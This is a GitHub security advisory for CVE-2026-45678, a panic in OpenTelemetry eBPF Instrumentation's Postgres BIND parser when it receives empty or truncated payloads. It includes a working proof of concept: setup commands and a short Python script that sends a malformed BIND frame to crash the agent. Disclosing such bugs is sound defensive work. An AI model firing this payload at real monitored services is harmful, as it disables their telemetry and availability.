# [H] OpenTelemetry eBPF Instrumentation: Postgres BIND parsing can panic on malformed payloads

## Summary
Severity: High
Advisory: GHSA-pgvv-q3wf-mm9m
CVE: CVE-2026-45678
CWE: CWE-20, CWE-754
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-pgvv-q3wf-mm9m
Type: github-advisory

## Affected
- Go: `go.opentelemetry.io/obi` — affected >=0 <0.9.0

## Details
### Summary

The Postgres protocol parser assumes `BIND` message payloads contain a valid NUL-terminated portal name. A crafted empty or unterminated payload can make OBI slice beyond the end of the captured buffer and panic.

### Details

The vulnerable logic is in [pkg/ebpf/common/sql_detect_postgres.go](https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/blob/d5691806adc98008bacd2b7a4a4e0cd38ea51227/pkg/components/ebpf/common/sql_detect_postgres.go#L286-L294). In the `BIND` case, OBI converts the full payload to a string with `unix.ByteSliceToString(msg.data)`, computes `portalLen := len(portal) + 1`, and then slices `msg.data[portalLen:]` to derive the statement name.

There is no check that `msg.data` actually contains a NUL terminator or even enough bytes for `portalLen`. With an empty payload or a truncated message, `portalLen` can exceed the slice length and trigger a runtime panic.

### PoC

Local testing with a minimal reproducer showed the expected `slice bounds out of range` crash for an empty BIND payload.

Use a vulnerable build:

```bash
git checkout v0.0.0-rc.1+build
make build
```

Start a local Postgres instance and OBI:

```bash
docker run --rm -e POSTGRES_PASSWORD=postgres -p 5432:5432 postgres:17
sudo ./bin/obi
```

Send a malformed `BIND` frame with an empty payload:

```python
# save as /tmp/pg-bind-poc.py
import socket, struct

tag = b'B'
length = struct.pack(">I", 4)
payload = b""

s = socket.create_connection(("127.0.0.1", 5432))
s.sendall(tag + length + payload)
s.close()
```

Run it:

```bash
python3 /tmp/pg-bind-poc.py
```

On a vulnerable build, the Postgres parser in OBI panics while processing the captured payload.

### Impact

This is a remote availability issue in OBI's Postgres parser. Any attacker able to send malformed Postgres traffic to a monitored service can crash the agent and stop telemetry collection for that node or process.

## References
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/security/advisories/GHSA-pgvv-q3wf-mm9m
- https://nvd.nist.gov/vuln/detail/CVE-2026-45678
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/releases/tag/v0.9.0
